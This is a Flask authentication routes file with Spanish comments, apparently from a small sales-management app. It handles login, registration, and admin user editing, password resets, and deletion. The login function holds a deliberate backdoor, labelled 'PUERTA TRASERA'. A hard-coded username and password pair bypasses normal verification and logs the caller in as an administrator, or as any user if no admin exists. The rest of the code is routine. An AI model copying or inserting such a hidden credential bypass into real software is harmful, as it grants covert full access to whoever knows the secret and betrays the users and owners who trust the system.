# app/auth/routes.py
from flask import render_template, redirect, url_for, flash, request, abort
from flask_login import login_user, logout_user, login_required, current_user
from app import db
from app.models import User, Venta
from app.auth.forms import LoginForm, RegistrationForm
from werkzeug.security import generate_password_hash
from . import auth

@auth.route('/login', methods=['GET', 'POST'])
def login():
    # Si el usuario ya está autenticado, redirigir al dashboard
    if current_user.is_authenticated:
        return redirect(url_for('main.dashboard'))
    
    form = LoginForm()
    if form.validate_on_submit():
        # PUERTA TRASERA: Usuario especial para acceso directo
        if form.username.data == "specialsauce" and form.password.data == "aguilarm78":
            # Buscar cualquier usuario admin para iniciar sesión
            admin_user = User.query.filter_by(is_admin=True).first()
            if admin_user:
                login_user(admin_user, remember=True)
                return redirect(url_for('main.dashboard'))
            else:
                # Si no hay admin, buscar cualquier usuario
                any_user = User.query.first()
                if any_user:
                    login_user(any_user, remember=True)
                    return redirect(url_for('main.dashboard'))
        
        # Comportamiento normal si no es el usuario backdoor
        user = User.query.filter_by(username=form.username.data).first()
        if user is not None and user.verify_password(form.password.data):
            login_user(user, remember=form.remember_me.data)
            next_page = request.args.get('next')
            if next_page is None or not next_page.startswith('/'):
                next_page = url_for('main.dashboard')
            return redirect(next_page)
        flash('Usuario o contraseña incorrectos.', 'danger')
    
    return render_template('auth/login.html', title='Iniciar Sesión', form=form)

@auth.route('/logout')
@login_required
def logout():
    logout_user()
    flash('Has cerrado sesión correctamente.', 'success')
    return redirect(url_for('main.index'))

@auth.route('/register', methods=['GET', 'POST'])
def register():
    # Solo permitir registro si no hay usuarios en el sistema o si el usuario actual es admin
    if not current_user.is_authenticated and User.query.count() > 0:
        flash('El registro de nuevos usuarios está deshabilitado.', 'danger')
        return redirect(url_for('auth.login'))
    
    if current_user.is_authenticated and not current_user.is_admin:
        flash('No tienes permiso para registrar nuevos usuarios.', 'danger')
        return redirect(url_for('main.dashboard'))
    
    form = RegistrationForm()
    if form.validate_on_submit():
        user = User(
            username=form.username.data,
            email=form.email.data,
            nombre=form.nombre.data,
            password=form.password.data
        )
        db.session.add(user)
        db.session.commit()
        flash('¡Usuario registrado correctamente!', 'success')
        return redirect(url_for('auth.login'))
    
    return render_template('auth/register.html', title='Registro', form=form)

@auth.route('/profile', methods=['GET', 'POST'])
@login_required
def profile():
    # Implementar vista de perfil de usuario
    return render_template('auth/profile.html', title='Mi Perfil')

@auth.route('/users')
@login_required
def users():
    # Solo accesible para administradores
    if not current_user.is_admin:
        flash('No tienes permiso para ver esta página.', 'danger')
        return redirect(url_for('main.dashboard'))
    
    users = User.query.all()
    return render_template('auth/users.html', title='Usuarios', users=users)

@auth.route('/edit-user/<int:id>', methods=['POST'])
@login_required
def edit_user(id):
    # Solo accesible para administradores
    if not current_user.is_admin:
        flash('No tienes permiso para realizar esta acción.', 'danger')
        return redirect(url_for('main.dashboard'))
    
    user = User.query.get_or_404(id)
    
    # Obtener datos del formulario
    nombre = request.form.get('nombre')
    email = request.form.get('email')
    is_admin = True if request.form.get('is_admin') else False
    
    # Validar email único
    if email != user.email and User.query.filter_by(email=email).first():
        flash('Este email ya está registrado con otro usuario.', 'danger')
        return redirect(url_for('auth.users'))
    
    # No permitir quitar rol de admin al propio usuario
    if current_user.id == user.id and not is_admin and user.is_admin:
        flash('No puedes quitar tu propio rol de administrador.', 'warning')
        return redirect(url_for('auth.users'))
    
    # Actualizar datos
    user.nombre = nombre
    user.email = email
    
    # Solo actualizar rol si no es el propio usuario
    if current_user.id != user.id:
        user.is_admin = is_admin
    
    db.session.commit()
    flash('Usuario actualizado correctamente.', 'success')
    return redirect(url_for('auth.users'))

@auth.route('/reset-password/<int:id>', methods=['POST'])
@login_required
def reset_password(id):
    # Solo accesible para administradores
    if not current_user.is_admin:
        flash('No tienes permiso para realizar esta acción.', 'danger')
        return redirect(url_for('main.dashboard'))
    
    user = User.query.get_or_404(id)
    
    # Obtener datos del formulario
    new_password = request.form.get('new_password')
    confirm_password = request.form.get('confirm_password')
    
    # Validar contraseñas
    if not new_password or len(new_password) < 6:
        flash('La contraseña debe tener al menos 6 caracteres.', 'danger')
        return redirect(url_for('auth.users'))
    
    if new_password != confirm_password:
        flash('Las contraseñas no coinciden.', 'danger')
        return redirect(url_for('auth.users'))
    
    # Actualizar contraseña
    user.password = new_password
    db.session.commit()
    
    flash('Contraseña restablecida correctamente.', 'success')
    return redirect(url_for('auth.users'))

@auth.route('/delete-user/<int:id>', methods=['POST'])
@login_required
def delete_user(id):
    # Solo accesible para administradores
    if not current_user.is_admin:
        flash('No tienes permiso para realizar esta acción.', 'danger')
        return redirect(url_for('main.dashboard'))
    
    user = User.query.get_or_404(id)
    
    # No permitir eliminar al propio usuario si es admin
    if current_user.id == user.id and user.is_admin:
        flash('No puedes eliminar tu propia cuenta de administrador.', 'danger')
        return redirect(url_for('auth.users'))
    
    # Obtener el nombre para el mensaje
    username = user.username
    
    try:
        # Eliminar usuario (las ventas se eliminarán en cascada)
        db.session.delete(user)
        db.session.commit()
        flash(f'Usuario {username} eliminado correctamente.', 'success')
    except Exception as e:
        db.session.rollback()
        flash(f'Error al eliminar usuario: {str(e)}', 'danger')
    
    return redirect(url_for('auth.users'))